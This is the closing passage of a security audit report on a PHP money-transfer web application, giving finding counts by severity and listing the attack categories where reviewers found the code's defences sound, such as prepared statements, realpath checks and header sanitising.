15. **Input Validation Library**: Centralized `sanitize.php` with type-specific validators (UUID, email, username, amount, bio, comment, filename, IP, redirect URL). Output encoding functions distinguish between HTML, JavaScript, and attribute contexts.

---

## STATISTICS

| Severity     | Count |
|-------------|-------|
| CRITICAL     | 1     |
| HIGH         | 1     |
| MEDIUM       | 5     |
| LOW          | 9     |
| INFO         | 6     |
| **Total**    | **22** |

---

## CATEGORIES REVIEWED WITH NO FINDINGS

The following attack categories were thoroughly reviewed and no exploitable vulnerabilities were identified:

- **SQL Injection**: All queries use prepared statements. No dynamic query construction found.
- **Insecure Deserialization**: No `unserialize()`, `json_decode()` of untrusted data into objects, or other deserialization sinks found.
- **Server-Side Request Forgery (SSRF)**: The only outbound HTTP call is the Discord webhook, which validates the URL against a Discord-specific regex pattern.
- **Path Traversal (Exploitable)**: `serve_image.php` uses `realpath()` and `str_starts_with()` correctly. `basename()` is applied to all user-supplied filenames. Storage directory is outside web root.
- **IDOR (Direct)**: Profile views use a database-level privacy gate (CASE WHEN). Transfers validate sender from session, not from user input. Transaction history is filtered by session user ID.
- **Authentication Bypass**: No bypass found. Login uses constant-time comparison with fallback hashing. Session version tracking prevents stale session reuse after password change.
- **Business Logic (Money)**: Self-transfer blocked at application AND database level. Negative amounts rejected by sanitize_amount(). Overflow protected by BIGINT UNSIGNED + CHECK constraint + application-level cap at 10 lakh. Amount format validated with strict regex before arithmetic.
- **Cryptographic Issues**: bcrypt with cost 10, SHA-384 pre-hash, HMAC-SHA256 for session fingerprints and CSRF tokens, random_bytes() for all token generation. No custom crypto.
- **CORS Misconfiguration**: The `Access-Control-Allow-Origin` in JSON responses uses `get_own_origin()` which returns the request's own origin, effectively allowing same-origin only. No wildcard or reflected origin.
- **Log Injection**: All logged values are sanitized to remove control characters and truncated. Syslog fallback also sanitizes exception messages.
- **Response Splitting**: `sanitize_header()` strips `\r`, `\n`, and URL-encoded variants from all header values. `enforce_https()` strips newlines from the redirect URL.

---

*End of Report*
